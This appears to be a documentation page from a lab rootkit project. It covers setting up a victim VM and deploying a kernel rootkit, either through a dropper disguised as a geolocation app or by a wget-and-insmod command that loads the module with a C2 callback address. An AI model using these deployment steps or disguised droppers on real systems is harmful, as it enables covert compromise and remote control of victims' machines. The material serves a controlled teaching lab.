---
title: "Victim VM Setup"
description: "Configure the victim VM and deploy the EpiRootkit"
icon: "shield"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 204
---



## Prerequisites

1. **Host setup**: [Host Environment Setup]({{< relref "environment.md" >}})
2. **VM disk**: `victim.qcow2` in `/var/lib/libvirt/images/`
3. **VM launched**: `sudo ./scripts/run_vms.sh`


## VM Access

- **IP**: 192.168.200.10 (static)
- **Credentials**: `victim` / `jules`
- **Target**: Ubuntu 20.04 LTS (kernel 5.4.0)

## Deploy Rootkit

Choose your deployment method:

{{< tabs tabTotal="2" >}}

{{% tab tabName="Dropper (Social Engineering)" %}}

### Automated Deployment

Use the social engineering dropper for realistic attack simulation:

1. **Access Landing Page**: `http://192.168.200.11:8080`
2. **Download NeoGeoLoc**: Click download on the landing page
3. **Run Application**: Execute the downloaded dropper
4. **Click Register**: Application automatically downloads and installs rootkit

**Details**: See [Dropper Deployment]({{< relref "dropper-deployment.md" >}}) for complete process and interface screenshots.

{{% /tab %}}

{{% tab tabName="Manual Deployment" %}}

### Direct Installation

For testing or development purposes:

1. **Get Payload**: Download rootkit files directly from attacker VM
2. **Transfer**: Copy `epirootkit.ko` to victim VM
3. **Install**: Load kernel module manually

```bash
# On victim VM
wget http://192.168.200.11:3000/download/epirootkit.ko
sudo insmod epirootkit.ko address=192.168.200.11 port=4444 #(default values)
```

{{% /tab %}}

{{< /tabs >}}



## Next Steps

1. **Control**: Use [C2 Server](../../03-attacking-program/overview.md) or [Web UI](../../04-web-ui/overview.md)
2. **Features**: Explore [Rootkit Features](../../05-epirootkit/features/)
